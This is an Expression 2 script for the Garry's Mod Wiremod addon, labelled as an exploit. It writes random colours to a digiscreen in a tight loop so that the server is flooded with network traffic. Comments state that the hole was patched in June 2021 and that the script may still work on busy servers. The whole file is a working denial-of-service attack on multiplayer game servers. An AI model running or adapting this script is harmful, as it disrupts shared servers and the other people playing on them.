@name exploits/digiscreen_nuke
@inputs DS:wirelink
@persist X Y RES CPU LIGHT:entity COLORS Ready PIXELS

# Patched on Jun 17 2021 in commit f54ff0a
# https://github.com/wiremod/wire/commit/f54ff0a

# Created by Fasteroid
# connect to a digiscreen to produce colorful net library spam
# multiple chips are needed to do anything significant
# mostly mitigated now since patch, might still work with 20+ players

if(first()){
    
    propSpawnUndo(0)
    runOnTick(1)
    
    RES = 64
    COLORS = 255*255*255
    PIXELS = RES^2
    
    # Stolen from an old friend
    function wirelink:initScreen(Resolution){
        This[1048574]=0 # Reset Screen and whatever was on it will be cleared.
        This[1048569]=2 # Set color mode to 3
        This[1048575]=1 # Apply changes
        This[1048572]=Resolution # Set new resolution on Y (Height)
        This[1048573]=Resolution # Set new resolution on X (Width)
    }
    
}   

if( changed(DS) ){ DS:initScreen(RES) Ready = 1 }
if(!Ready){exit()}

while( opcounter()<10000 ){
    
    DS[randint(0,PIXELS)] = randint(0,COLORS)
    
}


